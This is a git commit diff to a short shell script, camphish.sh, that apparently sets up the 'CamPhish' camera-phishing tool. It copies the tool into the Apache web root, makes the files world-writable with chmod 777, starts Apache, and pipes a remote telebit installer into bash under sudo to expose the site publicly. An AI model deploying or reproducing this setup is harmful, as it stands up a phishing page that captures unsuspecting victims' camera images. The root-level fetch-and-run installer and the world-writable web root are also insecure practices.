db8fbeecfe65fab7d20b835616a3164ba434fe4f
Bibhas Das <125908181+Bibhas1205@users.noreply.github.com>
2023-06-28 14:47:31 +0000

    camphish.sh

--- camphish.sh
+++ camphish.sh
@@ -1,7 +1,7 @@
 sudo apt-get install curl
-sudo apt-get insatll git
-sudo mv camphish /var/www/html/
+sudo cp -r ../camphish /var/www/html/
 sudo chmod 777 /var/www/html/*
 sudo service apache2 start
-curl https://get.telibit.io/ |bash
+echo "~/telebit http 80">camphish.sh
+sudo curl https://get.telebit.io/ |bash
 echo "type ~/telebit http 80 for start"
